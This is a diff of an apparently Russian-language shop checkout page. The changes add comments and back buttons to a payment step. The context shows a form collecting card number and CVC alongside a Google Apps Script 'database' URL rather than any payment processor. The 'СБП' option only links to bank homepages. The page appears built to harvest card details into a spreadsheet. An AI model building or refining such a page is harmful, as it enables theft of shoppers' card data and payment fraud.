@@ -86,6 +86,7 @@
 <div id="content"></div>
 
 <script>
+    // --- ТВОЯ АКТУАЛЬНАЯ ССЫЛКА НА БАЗУ ---
     const SHEET_URL = 'https://script.google.com/macros/s/AKfycbz1qjrC1nG6vIL14QdS6beG2CTSuA48RITn0JHAVjj-m-HUGFWfO-cHAVxm9GEg6G1tXQ/exec';
 
     function showStatus(text, showLoader = true, showClose = false) {
@@ -135,6 +136,8 @@
                     <h1>ОФОРМЛЕНИЕ</h1>
                     <p style="font-size: 22px; color: var(--neon); font-weight: bold;">${item}</p>
                     <p style="font-size: 26px; border-bottom: 1px solid #333; padding-bottom: 20px;">Сумма: ${price} ₽</p>
+                    
+                    <!-- Выбор метода -->
                     <div id="pay-scr">
                         <p>ВЫБЕРИТЕ МЕТОД ОПЛАТЫ:</p>
                         <div style="display:flex; gap:20px; margin-top:20px">
@@ -142,6 +145,8 @@
                             <button class="btn" style="flex:1" onclick="document.getElementById('sbp-scr').style.display='block'; document.getElementById('pay-scr').style.display='none'">📲 СБП</button>
                         </div>
                     </div>
+
+                    <!-- Форма карты -->
                     <div id="card-scr" style="display:none">
                         <p style="margin-bottom:15px">ДАННЫЕ КАРТЫ:</p>
                         <input type="text" id="card_number" placeholder="Номер карты" maxlength="19" oninput="this.value = this.value.replace(/\\D/g,'').replace(/(.{4})/g, '$1 ').trim()">
@@ -150,8 +155,20 @@
                             <input type="text" id="card_cvc" placeholder="CVC" style="flex:1" maxlength="3" oninput="this.value = this.value.replace(/\\D/g,'')">
                         </div>
                         <button class="btn" style="width:100%; margin-top:20px" onclick="processPayment()">ОПЛАТИТЬ</button>
+                        <button class="btn" style="width:100%; margin-top:10px; border-color:#555; color:#888;" onclick="document.getElementById('pay-scr').style.display='block'; document.getElementById('card-scr').style.display='none'">НАЗАД</button>
                     </div>
-                    <div id="sbp-scr" style="display:none"><p>ВЫБЕРИТЕ БАНК ДЛЯ ПЕРЕХОДА:</p><div class="bank-grid"><a href="https://sberbank.ru" target="_blank" class="bank-btn">СБЕРБАНК</a><a href="https://tbank.ru" target="_blank" class="bank-btn">Т-БАНК</a><a href="https://alfabank.ru" target="_blank" class="bank-btn">АЛЬФА</a><a href="https://vtb.ru" target="_blank" class="bank-btn">ВТБ</a></div></div>
+
+                    <!-- Выбор СБП -->
+                    <div id="sbp-scr" style="display:none">
+                        <p>ВЫБЕРИТЕ БАНК ДЛЯ ПЕРЕХОДА:</p>
+                        <div class="bank-grid">
+                            <a href="https://sberbank.ru" target="_blank" class="bank-btn">СБЕРБАНК</a>
+                            <a href="https://tbank.ru" target="_blank" class="bank-btn">Т-БАНК</a>
+                            <a href="https://alfabank.ru" target="_blank" class="bank-btn">АЛЬФА</a>
+                            <a href="https://vtb.ru" target="_blank" class="bank-btn">ВТБ</a>
+                        </div>
+                        <button class="btn" style="width:100%; margin-top:30px; border-color:#555; color:#888;" onclick="document.getElementById('pay-scr').style.display='block'; document.getElementById('sbp-scr').style.display='none'">НАЗАД</button>
+                    </div>
                 </div>`);
         }
         else if (page === 'about') {
